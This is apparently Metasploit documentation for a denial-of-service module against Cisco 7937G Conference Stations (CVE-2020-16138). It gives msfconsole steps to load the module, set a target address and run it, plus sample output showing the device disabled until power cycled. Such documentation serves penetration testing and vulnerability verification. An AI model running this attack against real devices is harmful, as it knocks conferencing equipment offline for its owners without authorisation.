## Vulnerable Application

  1. Obtain a Cisco 7937G Conference Station.
  2. Enable SSH Access on the device.
  3. It has been observed that based on the firmware available from Cisco, all version are likely vulnerable.

## Verification Steps

  1. Start msfconsole
  2. Do: `use auxiliary/dos/cisco/CVE-2020-16138`
  3. Do: `set RHOST 192.168.1.10`
  4. Do: `run`
  5. The conference station should now be inoperable until it is power cycled

## Options

  1. rhost (required) - Target addres
  2. timeout (not required) - Timeout in seconds to wait before aborting

## Scenarios

#### Successful Scenario:
```
[*] Starting server...
[*] 192.168.110.209 - Connected (version 2.0, client OpenSSH_4.3)
[-] 192.168.110.209 - Exception: Incompatible ssh peer (no acceptable kex algorithm)
[-] 192.168.110.209 - Traceback (most recent call last):

[-] 192.168.110.209 - 
[*] 192.168.110.209 - DoS non-reset attack completed!
[*] 192.168.110.209 - Errors are intended.
[*] 192.168.110.209 - Device must be power cycled to restore functionality.
[*] Auxiliary module execution completed
```

#### Unsuccessful Scenario:
```
[*] Starting server...
[-] 192.168.110.209 - Device doesn't appear to be functioning (already DoS'd?) or SSH is not enabled.
[*] Auxiliary module execution completed
```
